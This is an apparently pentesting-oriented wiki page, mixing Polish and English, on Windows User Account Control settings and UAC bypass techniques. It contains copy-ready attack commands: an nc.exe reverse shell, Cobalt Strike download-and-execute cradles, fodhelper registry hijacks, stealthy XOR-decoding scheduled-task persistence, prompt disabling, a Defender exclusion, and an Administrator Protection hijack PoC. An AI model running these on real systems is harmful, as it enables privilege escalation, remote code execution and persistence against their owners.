# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która wymusza wyświetlanie monitów o zgodę przy działaniach wymagających podwyższeń uprawnień. Aplikacje mają różne poziomy `integrity`, a program o wysokim poziomie może wykonywać zadania, które **mogą potencjalnie zagrozić systemowi**. Gdy UAC jest włączony, aplikacje i zadania zawsze **uruchamiane są w kontekście bezpieczeństwa konta niebędącego administratorem**, chyba że administrator wyraźnie przyzna tym aplikacjom/zadaniom uprawnienia na poziomie administratora. To udogodnienie chroniące administratorów przed niezamierzonymi zmianami, ale nie jest traktowane jako granica bezpieczeństwa.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Polityki instalacji oprogramowania w Windows

Domyślne ustawienia lokalnych polityk bezpieczeństwa (narzędzie "secpol.msc" na większości systemów) są skonfigurowane tak, aby **uniemożliwić użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik bez uprawnień administracyjnych pobierze instalator twojego oprogramowania, nie będzie w stanie go uruchomić bez konta administratora.

### Klucze rejestru wymuszające, by UAC pytał o podwyższenie uprawnień

Jako standardowy użytkownik bez praw administratora możesz zadbać o to, by konto "standard" było **monitowane o poświadczenia przez UAC** gdy próbuje wykonać pewne akcje. Ta operacja wymaga modyfikacji odpowiednich **kluczy rejestru**, do czego potrzebujesz uprawnień administratora, chyba że istnieje **UAC bypass**, albo atakujący jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, te zmiany wymuszą, aby użytkownik **ponownie wprowadził swoje poświadczenia konta**, aby wykonać operacje administracyjne.

**Jedyną wadą jest to, że podejście to wymaga wyłączenia UAC, aby działało, co jest mało prawdopodobne w środowiskach produkcyjnych.**

Klucze rejestru i wpisy, które należy zmienić, to następujące (z ich wartościami domyślnymi w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to także wykonać ręcznie za pomocą narzędzia Local Security Policy. Po zmianie operacje administracyjne będą wymagać ponownego wprowadzenia poświadczeń.

### Uwaga

**User Account Control is not a security boundary.** Dlatego standardowi użytkownicy nie mogą wyrwać się ze swoich kont i uzyskać praw administratora bez lokalnego exploit'u eskalacji uprawnień.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Uprawnienia UAC

- Internet Explorer Protected Mode używa kontroli integralności, aby zapobiec dostępowi procesów o wysokim poziomie integralności (np. przeglądarek) do danych o niskim poziomie integralności (np. folderu tymczasowych plików internetowych). Odbywa się to poprzez uruchomienie przeglądarki z tokenem niskiej integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskiej integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom zdalnego wykonania kodu przed uzyskaniem dostępu do wrażliwych danych na systemie.
- Gdy użytkownik loguje się do Windows, system tworzy token dostępu, który zawiera listę uprawnień użytkownika. Uprawnienia są definiowane jako kombinacja praw i możliwości użytkownika. Token zawiera także listę poświadczeń użytkownika, czyli danych używanych do uwierzytelnienia użytkownika na komputerze i do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować Windows tak, aby automatycznie logował konkretnego użytkownika przy starcie, ustaw klucz rejestru **`AutoAdminLogon`**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tego tylko na bezpiecznych maszynach, ponieważ ujawnia hasło w rejestrze.

Ustaw następujące klucze przy użyciu Registry Editor lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Zauważ, że jeśli masz graficzny dostęp do ofiary, UAC bypass jest prosty — możesz po prostu kliknąć "Yes", gdy pojawi się monit UAC

UAC bypass jest potrzebny w następującym przypadku: **UAC jest aktywowany, twój proces działa w kontekście o średnim poziomie integralności, i twój użytkownik należy do administrators group**.

Ważne jest, aby wspomnieć, że **znacznie trudniej jest obejść UAC, jeśli jest ustawiony na najwyższy poziom bezpieczeństwa (Always) niż gdy jest na którymkolwiek z pozostałych poziomów (Default).**

### UAC disabled

Jeśli UAC jest już wyłączony (`ConsentPromptBehaviorAdmin` jest **`0`**), możesz **wykonać reverse shell z uprawnieniami administratora** (wysoki poziom integralności) używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Jeśli masz shell z użytkownikiem należącym do grupy Administrators, możesz **zamontować udział C$** przez SMB (system plików) lokalnie jako nowy dysk i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass z Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawiony na maksymalny poziom zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają także kilka modułów do **bypass** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie w [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), który jest **kompilacją** kilku UAC bypass exploits. Zwróć uwagę, że będziesz musiał **skompilować UACME przy użyciu Visual Studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć **który z nich potrzebujesz.**\
Powinieneś **być ostrożny**, ponieważ niektóre bypasses **wywołają monity w innych programach**, które **ostrzegą** **użytkownika**, że coś się dzieje.

UACME zawiera **wersję build, od której każda technika zaczęła działać**. Możesz wyszukać technikę wpływającą na Twoje wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Również, korzystając z [this](https://en.wikipedia.org/wiki/Windows_10_version_history) strony otrzymasz wydanie Windows `1607` z numerów build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany binarny plik `fodhelper.exe` jest automatycznie podwyższany w nowoczesnych wersjach Windows. Po uruchomieniu odczytuje poniższą ścieżkę rejestru dla użytkownika bez weryfikacji werbu `DelegateExecute`. Zapisanie tam komendy umożliwia procesowi o Medium Integrity (użytkownik jest w Administrators) uruchomienie procesu o High Integrity bez monitu UAC.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw swój payload, następnie uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bit PowerShell z 32-bit procesu na 64-bit Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd, lub ścieżka do EXE). Unikaj okien UIs wymagających interakcji, aby zachować stealth.

#### Wariant CurVer/extension hijack (tylko HKCU)

Najnowsze próbki nadużywające `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** poprzez per-user wartość `CurVer`. Auto-elevated binary nadal rozwiązuje handler pod `HKCU`, więc nie jest wymagany admin token do wstawienia kluczy:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po eskalowaniu uprawnień, malware zwykle **wyłącza przyszłe monity** przez ustawienie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, następnie wykonuje dodatkowe defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby działać z wysoką integralnością. Typowe zadanie persistence przechowuje na dysku **XOR-encrypted PowerShell script** i dekoduje/wykonuje go w pamięci co godzinę:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Źródła
- [HTB: Rainbow – SEH overflow prowadzący do RCE przez HTTP (0xdf) – kroki UAC bypass dla fodhelper](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – kolekcja technik UAC bypass](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
